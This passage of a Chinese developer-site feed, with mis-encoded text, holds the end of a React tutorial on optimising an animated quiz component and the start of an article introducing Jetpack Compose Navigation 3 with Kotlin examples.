<li>åˆç‰ˆä¸­åŠ¨ç”»æ˜¯éš DOM æŒ‚è½½ç›´æ¥è§¦å‘çš„ï¼Œè€Œè¿›é˜¶ç‰ˆå¢åŠ äº† imageLoaded çŠ¶æ€ï¼Œé€šè¿‡ onLoad äº‹ä»¶ç¡®ä¿å›¾ç‰‡èµ„æºçœŸå®ä¸‹è½½å®Œæˆåæ‰å¯åŠ¨é€æ˜åº¦åŠ¨ç”»ã€‚</li>
</ul>
<p><strong>3. ç»„ä»¶åŒ–æ‹†åˆ†</strong></p>
<ul>
<li>å°†æ¯ä¸€é“é¢˜é€»è¾‘å°è£…åœ¨ StepItem ä¸­ï¼Œæ¯ä¸ª StepItem ç»´æŠ¤è‡ªå·±çš„ opacity çŠ¶æ€ï¼Œé€»è¾‘äº’ä¸å¹²æ‰°ï¼Œçˆ¶ç»„ä»¶åªè´Ÿè´£ç»´æŠ¤ currentStep è¿›åº¦ï¼ŒèŒè´£å•ä¸€åŒ–ã€‚</li>
</ul>
<p><strong>4. å­˜åœ¨çš„ä¸è¶³</strong></p>
<ul>
<li>æ€§èƒ½ç“¶é¢ˆï¼ˆå…¨é‡æ¸²æŸ“ä¾ç„¶å­˜åœ¨ï¼‰ï¼š è™½ç„¶æŠ½ç¦»äº†ç»„ä»¶ï¼Œä½† Index é‡Œä¾ç„¶åœ¨ map å…¨é‡æ¸²æŸ“æ‰€æœ‰çš„ StepItemã€‚</li>
</ul>
<h3 data-id="heading-8">è¿›é˜¶ç‰ˆ--æ•ˆæœå±•ç¤º</h3>
<p><span href="https://code.juejin.cn/pen/7595792784619995162" class="code-editor-container"><iframe class="code-editor-frame" data-code="code-editor-element" data-code-id="7595792784619995162" data-src="https://code.juejin.cn/pen/7595792784619995162" style="display:none;" loading="lazy"/><span class="loading-placeholder" style="display:none"><img class="placeholder-image" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8CAYAAAA6/NlyAAAAJElEQVRoge3BMQEAAADCoPVP7WkJoAAAAAAAAAAAAAAAAAAAbjh8AAFte11jAAAAAElFTkSuQmCC" loading="lazy"/><span class="loading-logo"/></span></span></p>
<h2 data-id="heading-9">æœ€ç»ˆç‰ˆ</h2>
<p>å®šä½ï¼š<strong>ä¸ä»…éœ€è¦å®Œç¾çš„è§†è§‰æ•ˆæœï¼Œè¿˜éœ€è¦æ·±å…¥åˆ°äº† React æ€§èƒ½ä¼˜åŒ–åº•å±‚ã€‚</strong></p>
<p>æ ¸å¿ƒä»£ç å±•ç¤º</p>
<pre><code class="hljs language-jsx" lang="jsx"><span class="hljs-keyword">const</span> <span class="hljs-title class_">StepItem</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">memo</span>(<span class="hljs-function">(<span class="hljs-params">{ item, index, isActive, onBegin, onAnswer }</span>) =&gt;</span> {
  <span class="hljs-comment">// åˆå¹¶åŠ¨ç”»çŠ¶æ€ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œå‡å°‘çŠ¶æ€æ›´æ–°æ¬¡æ•°</span>
  <span class="hljs-keyword">const</span> [animationState, setAnimationState] = <span class="hljs-title function_">useState</span>({
    <span class="hljs-attr">imageOpacity</span>: <span class="hljs-number">0</span>,
    <span class="hljs-attr">question1Opacity</span>: <span class="hljs-number">0</span>,
    <span class="hljs-attr">question2Opacity</span>: <span class="hljs-number">0</span>,
  });
  <span class="hljs-keyword">const</span> [imageLoaded, setImageLoaded] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">false</span>);
  <span class="hljs-keyword">const</span> imageRef = <span class="hljs-title function_">useRef</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-comment">// å½“ç»„ä»¶å˜ä¸ºæ¿€æ´»çŠ¶æ€æ—¶é‡ç½®åŠ¨ç”»çŠ¶æ€</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (isActive) {
      <span class="hljs-title function_">setAnimationState</span>({
        <span class="hljs-attr">imageOpacity</span>: <span class="hljs-number">0</span>,
        <span class="hljs-attr">question1Opacity</span>: <span class="hljs-number">0</span>,
        <span class="hljs-attr">question2Opacity</span>: <span class="hljs-number">0</span>,
      });
      <span class="hljs-title function_">setImageLoaded</span>(<span class="hljs-literal">false</span>);
    }
    <span class="hljs-comment">// æ£€æŸ¥å›¾ç‰‡æ˜¯å¦å·²ç»åŠ è½½å®Œæˆï¼ˆå¤„ç†ç¼“å­˜æƒ…å†µï¼‰</span>
    <span class="hljs-keyword">if</span> (isActive &amp;&amp; imageRef.<span class="hljs-property">current</span>) {
      <span class="hljs-comment">// å¦‚æœå›¾ç‰‡å·²ç»åŠ è½½å®Œæˆï¼ˆä»ç¼“å­˜ä¸­ï¼‰ï¼Œç«‹å³è®¾ç½®åŠ è½½çŠ¶æ€</span>
      <span class="hljs-keyword">if</span> (imageRef.<span class="hljs-property">current</span>.<span class="hljs-property">complete</span> &amp;&amp; imageRef.<span class="hljs-property">current</span>.<span class="hljs-property">naturalHeight</span> !== <span class="hljs-number">0</span>) {
        <span class="hljs-title function_">setImageLoaded</span>(<span class="hljs-literal">true</span>);
      }
    }
  }, [isActive]);

  <span class="hljs-comment">// å¤„ç†åŠ¨ç”»åºåˆ—</span>
  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">if</span> (!isActive || !imageLoaded) <span class="hljs-keyword">return</span>;

    <span class="hljs-keyword">const</span> timers = [];

    <span class="hljs-comment">// ç«‹å³æ˜¾ç¤ºå›¾ç‰‡</span>
    <span class="hljs-title function_">setAnimationState</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> ({ ...prev, <span class="hljs-attr">imageOpacity</span>: <span class="hljs-number">1</span> }));

    <span class="hljs-comment">// å»¶è¿Ÿæ˜¾ç¤º question1</span>
    <span class="hljs-keyword">if</span> (item.<span class="hljs-property">question1</span>) {
      <span class="hljs-keyword">const</span> question1Timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
        <span class="hljs-title function_">setAnimationState</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> ({ ...prev, <span class="hljs-attr">question1Opacity</span>: <span class="hljs-number">1</span> }));

        <span class="hljs-comment">// question1 æ˜¾ç¤ºåï¼Œå»¶è¿Ÿæ˜¾ç¤º question2</span>
        <span class="hljs-keyword">if</span> (item.<span class="hljs-property">question2</span>) {
          <span class="hljs-keyword">const</span> question2Timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
            <span class="hljs-title function_">setAnimationState</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> ({ ...prev, <span class="hljs-attr">question2Opacity</span>: <span class="hljs-number">1</span> }));
          }, <span class="hljs-number">500</span>);
          timers.<span class="hljs-title function_">push</span>(question2Timer);
        }
      }, <span class="hljs-number">500</span>);
      timers.<span class="hljs-title function_">push</span>(question1Timer);
    }

    <span class="hljs-keyword">return</span> <span class="hljs-function">() =&gt;</span> {
      timers.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">timer</span> =&gt;</span> <span class="hljs-built_in">clearTimeout</span>(timer));
    };
  }, [isActive, imageLoaded, item.<span class="hljs-property">question1</span>, item.<span class="hljs-property">question2</span>]);

  <span class="hljs-keyword">const</span> handleImageLoad = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">setImageLoaded</span>(<span class="hljs-literal">true</span>);
  }, []);

  <span class="hljs-keyword">const</span> stepClassName = <span class="hljs-title function_">useMemo</span>(
    <span class="hljs-function">() =&gt;</span>
      <span class="hljs-string">`step-content step<span class="hljs-subst">${index}</span> <span class="hljs-subst">${isActive ? <span class="hljs-string">'fade-enter-done'</span> : <span class="hljs-string">'fade-item'</span>}</span>`</span>,
    [index, isActive]
  );

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{stepClassName}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">img</span>
        <span class="hljs-attr">ref</span>=<span class="hljs-string">{imageRef}</span>
        <span class="hljs-attr">className</span>=<span class="hljs-string">"image-bg"</span>
        <span class="hljs-attr">src</span>=<span class="hljs-string">{item.imgSrc}</span>
        <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>
        <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">opacity:</span> <span class="hljs-attr">animationState.imageOpacity</span> }}
        <span class="hljs-attr">onLoad</span>=<span class="hljs-string">{handleImageLoad}</span>
      /&gt;</span>
      {index === 0 &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{onBegin}</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"begin-testing"</span> /&gt;</span>}
      {item.question1 &amp;&amp; (
        <span class="hljs-tag">&lt;<span class="hljs-name">img</span>
          <span class="hljs-attr">onClick</span>=<span class="hljs-string">{onAnswer}</span>
          <span class="hljs-attr">className</span>=<span class="hljs-string">"question question1"</span>
          <span class="hljs-attr">src</span>=<span class="hljs-string">{item.question1}</span>
          <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>
          <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">opacity:</span> <span class="hljs-attr">animationState.question1Opacity</span> }}
        /&gt;</span>
      )}
      {item.question2 &amp;&amp; (
        <span class="hljs-tag">&lt;<span class="hljs-name">img</span>
          <span class="hljs-attr">onClick</span>=<span class="hljs-string">{onAnswer}</span>
          <span class="hljs-attr">className</span>=<span class="hljs-string">"question question2"</span>
          <span class="hljs-attr">src</span>=<span class="hljs-string">{item.question2}</span>
          <span class="hljs-attr">alt</span>=<span class="hljs-string">""</span>
          <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">opacity:</span> <span class="hljs-attr">animationState.question2Opacity</span> }}
        /&gt;</span>
      )}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
});

<span class="hljs-title class_">StepItem</span>.<span class="hljs-property">displayName</span> = <span class="hljs-string">'StepItem'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">Index</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> [currentStep, setCurrentStep] = <span class="hljs-title function_">useState</span>(<span class="hljs-number">0</span>);
  <span class="hljs-keyword">const</span> handleBeginTesting = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">setCurrentStep</span>(<span class="hljs-number">1</span>);
  }, []);

  <span class="hljs-keyword">const</span> handleAnsweringQuestion = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">setCurrentStep</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev + <span class="hljs-number">1</span>);
  }, []);

  <span class="hljs-keyword">const</span> renderedItems = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">return</span> questionList
      .<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">item, index</span>) =&gt;</span> ({ item, index }))
      .<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">{ index }</span>) =&gt;</span> index &lt;= currentStep + <span class="hljs-number">1</span>);
  }, [currentStep]);

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"third-edition-container"</span>&gt;</span>
      {renderedItems.map(({ item, index }) =&gt; (
        <span class="hljs-tag">&lt;<span class="hljs-name">StepItem</span>
          <span class="hljs-attr">key</span>=<span class="hljs-string">{index}</span>
          <span class="hljs-attr">item</span>=<span class="hljs-string">{item}</span>
          <span class="hljs-attr">index</span>=<span class="hljs-string">{index}</span>
          <span class="hljs-attr">isActive</span>=<span class="hljs-string">{currentStep</span> === <span class="hljs-string">index}</span>
          <span class="hljs-attr">onBegin</span>=<span class="hljs-string">{handleBeginTesting}</span>
          <span class="hljs-attr">onAnswer</span>=<span class="hljs-string">{handleAnsweringQuestion}</span>
        /&gt;</span>
      ))}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};
</code></pre>
<h4 data-id="heading-10">ä»¥ä¸‹æ˜¯æœ€ç»ˆç‰ˆçš„è¯¦ç»†ä»£ç åˆ†æï¼š</h4>
<p><strong>1. æ€§èƒ½ä¼˜åŒ–ç»„åˆ</strong></p>
<ul>
<li>React.memo + useCallbackï¼šé€šè¿‡è®°å¿†åŒ–ç»„ä»¶å’ŒæŒä¹…åŒ–å‡½æ•°å¼•ç”¨ï¼Œç¡®ä¿å½“ currentStep å˜åŒ–æ—¶ï¼Œåªæœ‰â€œå½“å‰æ´»è·ƒé¢˜â€å’Œâ€œä¸‹ä¸€é¢˜â€ä¼šè§¦å‘å¿…è¦çš„é‡ç»˜ï¼Œå…¶ä»–å·²åŠ è½½çš„é¢˜ç›®å®Œå…¨é™æ­¢ã€‚</li>
</ul>
<p><strong>2. çŠ¶æ€å¯¹è±¡åŒ–</strong></p>
<ul>
<li>å°†ä¸‰ä¸ªç‹¬ç«‹çš„ opacity çŠ¶æ€åˆå¹¶ä¸º animationState å¯¹è±¡ã€‚è¿™æ„å‘³ç€åŸæœ¬éœ€è¦ä¸‰æ¬¡ setStateï¼ˆè§¦å‘ä¸‰æ¬¡æ¸²æŸ“ï¼‰çš„æ“ä½œï¼Œç°åœ¨åªéœ€ä¸€æ¬¡å³å¯å®Œæˆã€‚</li>
</ul>
<p><strong>3. å›¾ç‰‡é¢„åŠ è½½ä¸ç¼“å­˜ç­–ç•¥</strong></p>
<ul>
<li><code>.filter(({ index }) =&gt; index &lt;= currentStep + 1)</code> è¿™ä¸€è¡Œä»£ç å®ç°äº†â€œåªåŠ è½½çœ‹è¿‡çš„â€å’Œâ€œæå‰åŠ è½½ä¸‹ä¸€é¢˜â€ã€‚è¿™æ—¢èŠ‚çœäº†é¦–å±æµé‡ï¼Œåˆä¿è¯äº†åˆ‡æ¢æ—¶çš„ç¬é—´å‘ˆç°ã€‚</li>
</ul>
<h3 data-id="heading-11">æœ€ç»ˆç‰ˆ--æ•ˆæœå±•ç¤º</h3>
<p><span href="https://code.juejin.cn/pen/7597005376978386970" class="code-editor-container"><iframe class="code-editor-frame" data-code="code-editor-element" data-code-id="7597005376978386970" data-src="https://code.juejin.cn/pen/7597005376978386970" style="display:none;" loading="lazy"/><span class="loading-placeholder" style="display:none"><img class="placeholder-image" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAAA8CAYAAAA6/NlyAAAAJElEQVRoge3BMQEAAADCoPVP7WkJoAAAAAAAAAAAAAAAAAAAbjh8AAFte11jAAAAAElFTkSuQmCC" loading="lazy"/><span class="loading-logo"/></span></span></p>
<h2 data-id="heading-12">æ€»ç»“</h2>
<p>ä»æœ€åˆçš„ä¸€ä¸ª map ä¸€æŠŠæ¢­ï¼Œåˆ°æœ€åå¼•å…¥ React.memoã€èµ„æºé¢„åŠ è½½ä»¥åŠå¯¹ç¼“å­˜æœºåˆ¶çš„æ·±åº¦æ‰“ç£¨ã€‚ä»å¥½ç”¨â€™å’Œâ€˜ä¸æ»‘â€™çš„èƒŒåæ˜¯æå…¶ä¸¥è°¨çš„æ€§èƒ½ç®¡ç†ã€‚å¸Œæœ›è¿™ä»½è¿›é˜¶ä¹‹è·¯èƒ½ç»™ä½ ä¸€äº›å¯å‘ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Compose Navigation 3 å‘å¸ƒåˆè¦é‡æ–°å­¦äº†]]></title>    <link>https://juejin.cn/post/7596890557546528814</link>    <guid>https://juejin.cn/post/7596890557546528814</guid>    <pubDate>2026-01-20T01:48:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596890557546528814" data-draft-id="7596983314805964850" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Compose Navigation 3 å‘å¸ƒåˆè¦é‡æ–°å­¦äº†"/> <meta itemprop="keywords" content="Android,Android Jetpack"/> <meta itemprop="datePublished" content="2026-01-20T01:48:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é»„æ—æ™´"/> <meta itemprop="url" content="https://juejin.cn/user/3985057546510423"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Compose Navigation 3 å‘å¸ƒåˆè¦é‡æ–°å­¦äº†
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3985057546510423/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é»„æ—æ™´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T01:48:57.000Z" title="Tue Jan 20 2026 01:48:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>2025 å¹´ 5 æœˆï¼ŒGoogle åœ¨ I/O å¤§ä¼šä¸Šæ­£å¼å‘å¸ƒäº† <strong>Jetpack Navigation 3</strong>ï¼Œè¿™æ˜¯ä¸€ä¸ªä»é›¶å¼€å§‹ä¸“ä¸º Compose æ„å»ºçš„å…¨æ–°å¯¼èˆªåº“ã€‚2026 å¹´ 1 æœˆï¼ŒJetBrains å‘å¸ƒçš„ Compose Multiplatform 1.10.0 ä¹Ÿæ­£å¼é›†æˆäº† Navigation 3ï¼Œæ ‡å¿—ç€è¿™ä¸€æ–¹æ¡ˆå·²è¿›å…¥ç”Ÿäº§å°±ç»ªé˜¶æ®µã€‚</p>
</blockquote>
<h2 data-id="heading-0">ä¸ºä»€ä¹ˆéœ€è¦ Navigation 3ï¼Ÿ</h2>
<p>è€ç‰ˆ Jetpack Navigation è¯ç”Ÿäº 2018 å¹´ï¼Œé‚£æ—¶ Jetpack Compose è¿˜æœªé—®ä¸–ã€‚å°½ç®¡åæ¥å¢åŠ äº† Compose æ”¯æŒï¼Œä½†å…¶æ ¸å¿ƒè®¾è®¡ç†å¿µä¸ Compose çš„å£°æ˜å¼ç¼–ç¨‹æ¨¡å‹å­˜åœ¨æ ¹æœ¬å†²çªï¼š</p>
<p><strong>Navigation 2 çš„ç—›ç‚¹ï¼š</strong></p>
<ul>
<li>â€¢ è¿”å›æ ˆæ˜¯ä¸ª"é»‘ç›’"ï¼Œåªèƒ½é—´æ¥è§‚å¯ŸçŠ¶æ€</li>
<li>â€¢ å•ç›®çš„åœ°çº¦æŸï¼Œéš¾ä»¥å®ç°è‡ªé€‚åº”å¤šçª—æ ¼å¸ƒå±€</li>
<li>â€¢ å¤æ‚çš„ XML å¯¼èˆªå›¾é…ç½®</li>
<li>â€¢ ä¸ Compose çš„çŠ¶æ€ç®¡ç†æ–¹å¼æ ¼æ ¼ä¸å…¥</li>
</ul>
<p><strong>Navigation 3 çš„è®¾è®¡å“²å­¦ï¼š</strong></p>
<ul>
<li>â€¢ <strong>å¼€å‘è€…æ‹¥æœ‰è¿”å›æ ˆ</strong>ï¼šä¸å†æ˜¯åº“å†…éƒ¨ç®¡ç†ï¼Œè€Œæ˜¯ä½ å®Œå…¨æŒæ§</li>
<li>â€¢ <strong>æœ€å°åŒ–å¹²é¢„</strong>ï¼šæä¾›å¯ç»„åˆçš„æ„å»ºå—ï¼Œè€Œéä¸€ä½“åŒ–æ–¹æ¡ˆ</li>
<li>â€¢ <strong>æ¨¡å—åŒ–ç»„ä»¶</strong>ï¼šæ›´å°çš„ã€å¯ç»„åˆçš„é›¶ä»¶ï¼Œä¾¿äºè‡ªå®šä¹‰</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1fdd9e7714e248c2bebd0cbb00b574ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6buE5p6X5pm0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769478537&amp;x-signature=iE4jwV9KquBOzTmE%2BtXF4xOsfxY%3D" alt="nav3_comparison.png" loading="lazy"/></p>
<h2 data-id="heading-1">å¿«é€Ÿä¸Šæ‰‹ï¼šä¸‰æ­¥æ„å»ºå¯¼èˆª</h2>
<h3 data-id="heading-2">å®šä¹‰ç›®çš„åœ° Key</h3>
<p>Navigation 3 ä½¿ç”¨ Kotlin çš„ data class æˆ– data object ä½œä¸ºè·¯ç”±æ ‡è¯†ï¼Œå‚æ•°ç›´æ¥å†…åµŒå…¶ä¸­ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span>Â kotlinx.serialization.Serializable
<span class="hljs-keyword">import</span>Â androidx.navigation3.runtime.NavKey

<span class="hljs-comment">//Â æ— å‚æ•°é¡µé¢</span>
<span class="hljs-meta">@Serializable</span>
<span class="hljs-keyword">data</span>Â <span class="hljs-keyword">object</span>Â HomeÂ :Â NavKey

<span class="hljs-comment">//Â å¸¦å‚æ•°é¡µé¢Â -Â å‚æ•°ç›´æ¥å®šä¹‰åœ¨Â dataÂ classÂ ä¸­</span>
<span class="hljs-meta">@Serializable</span>
<span class="hljs-keyword">data</span>Â <span class="hljs-keyword">class</span>Â <span class="hljs-title class_">ProductDetail</span>(
Â Â Â Â <span class="hljs-keyword">val</span>Â productId:Â String,
Â Â Â Â <span class="hljs-keyword">val</span>Â source:Â StringÂ =Â <span class="hljs-string">"home"</span>Â Â <span class="hljs-comment">//Â æ”¯æŒé»˜è®¤å€¼</span>
)Â :Â NavKey

<span class="hljs-comment">//Â å¤æ‚å‚æ•°ä¹Ÿä¸åœ¨è¯ä¸‹</span>
<span class="hljs-meta">@Serializable</span>
<span class="hljs-keyword">data</span>Â <span class="hljs-keyword">class</span>Â <span class="hljs-title class_">UserProfile</span>(
Â Â Â Â <span class="hljs-keyword">val</span>Â userId:Â <span class="hljs-built_in">Long</span>,
Â Â Â Â <span class="hljs-keyword">val</span>Â showEditButton:Â <span class="hljs-built_in">Boolean</span>Â =Â <span class="hljs-literal">false</span>
)Â :Â NavKey
</code></pre>
<h3 data-id="heading-3">åˆ›å»ºè¿”å›æ ˆ</h3>
<p>è¿”å›æ ˆå°±æ˜¯ä¸€ä¸ªæ™®é€šçš„å¯å˜åˆ—è¡¨ï¼Œå¯¼èˆªæ“ä½œ = åˆ—è¡¨æ“ä½œï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span>Â <span class="hljs-title">AppNavigation</span><span class="hljs-params">()</span></span>Â {
Â Â Â Â <span class="hljs-comment">//Â è¿”å›æ ˆÂ -Â å°±æ˜¯ä¸ªæ™®é€šåˆ—è¡¨ï¼</span>
Â Â Â Â <span class="hljs-keyword">val</span>Â backStackÂ =Â rememberÂ {
Â Â Â Â Â Â Â Â mutableStateListOf&lt;NavKey&gt;(Home)
Â Â Â Â }

Â Â Â Â <span class="hljs-comment">//Â å¯¼èˆªåˆ°æ–°é¡µé¢Â =Â æ·»åŠ å…ƒç´ </span>
Â Â Â Â <span class="hljs-function"><span class="hljs-keyword">fun</span>Â <span class="hljs-title">navigateTo</span><span class="hljs-params">(destination:Â <span class="hljs-type">NavKey</span>)</span></span>Â {
Â Â Â Â Â Â Â Â backStack.add(destination)
Â Â Â Â }

